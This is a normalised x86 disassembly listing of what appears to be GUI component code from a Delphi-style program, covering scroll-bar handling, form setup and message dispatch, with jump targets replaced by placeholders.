mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_455818
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_455818
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_455dfc
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_455c80
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_455818
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45601c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440694
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455498
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455498
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_456094
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403290
mov eax [ esi + 0x20c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4407b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4560e0
push ebx
mov ebx eax
mov eax ebx
call sub_441920
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4562f8
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bcc0
test al al
jne r-xdata
mov eax ebx
call sub_444968
push eax
call sub_425694
sub_456120
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456278
mov ecx edi
mov edx esi
mov eax ebx
call sub_441068
pop edi
pop esi
pop ebx
retn
sub_456160
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456268
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43db50
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_455730
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_455c80
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44165c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44165c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413918
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43d8bc
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45626f
mov eax [ ebp - 0x10 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_455578
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413a74
xor ecx ecx
mov edx 0xb03e
call sub_43f334
inc ebx
dec esi
jne r-xdata
sub_45629c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_455dd0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_455dd0
mov eax ebx
call sub_456278
jmp r-xdata
sub_4562f8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
xor eax eax
push ebp
push sub_4563e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_455898
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_455898
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_455f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_455f04
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_455f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_455f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_455f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_455f04
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_456408
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43dc64
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43dc90
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43dc64
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43dc90
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43db50
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_455c80
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43db50
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43db94
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_455c80
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43db50
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_455c80
mov eax ebx
call sub_43db50
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43db94
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43db94
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_455c80
mov eax ebx
call sub_43db94
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45655c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_455c80
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_455c80
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_406118
mov edx eax
mov eax ebp
call sub_455dd0
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_406118
mov edx eax
mov eax ebp
call sub_455dd0
sub_456600
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45655c
mov ecx edi
mov edx esi
mov eax ebx
call sub_444474
pop edi
pop esi
pop ebx
retn
sub_456628
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_456692
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442f54
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456699
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_456699
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4566d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_456278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4566d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4566d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4562f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45674c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db94
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_423a38
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43db50
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_423a38
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412668
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4409d4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4567bc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45681d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40341c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_443ce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456824
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45684c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4569b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_456990
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031d8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4035b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456997
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_456958
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413834
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
sub_4569d8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40348c
and [ ebx + 0x2f4 ] 0xdf
sub_456a10
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45601c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43d8bc
xor edx edx
mov eax ebx
call sub_43d8e0
mov edx 0x140
mov eax ebx
call sub_43d908
mov edx 0xf0
mov eax ebx
call sub_43d92c
mov dl 0x1
mov eax [ r-xdata ]
call sub_422fcc
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45732c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43cd28
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031d8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_457690
xor edx edx
mov eax ebx
call sub_43e310
xor edx edx
mov eax ebx
call sub_43e278
mov dl 0x1
mov eax ebx
call sub_444aa8
mov edx ebx
mov eax [ rw-data ]
call sub_45bcf4
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_456b89
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_4196cc
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413bb8
xor edx edx
mov eax ebx
call sub_416650
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45ab9c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_456bf4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40361c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_456cbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459518
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45bd2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403290
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403290
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cdfc
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_456094
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456cc5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_456cd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_403730#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457690
sub_456d1e
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40348c
test al al
jne r-xdata
call sub_403a98
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a44
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457690
sub_456d54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_456d95
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_456db4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44023c
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45905c
sub_456df0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d61c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413918
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_458454
mov edx esi
mov eax ebp
call sub_413bb8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45842c
mov edx esi
mov eax edi
call sub_458454
jmp r-xdata
xor edx edx
mov eax edi
call sub_458408
sub_456efc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441200
xor edx edx
push ebp
push sub_457152
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44095c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43db68
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43dbac
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_457284
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43f334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457159
mov eax [ ebp - 0x4 ]
call sub_441208
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45655c
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44442c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45655c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44442c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41c908
push eax
call sub_406118
mov edx eax
mov eax esi
call sub_41c910
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call sub_406118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call sub_406118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_406118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_406118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_457161
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441ca8
push 0x0
push 0x0
push ebx
push sub_457268
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_457234
push ebx
push sub_45724c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_457213
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416d48
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43e278
sub_45729f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
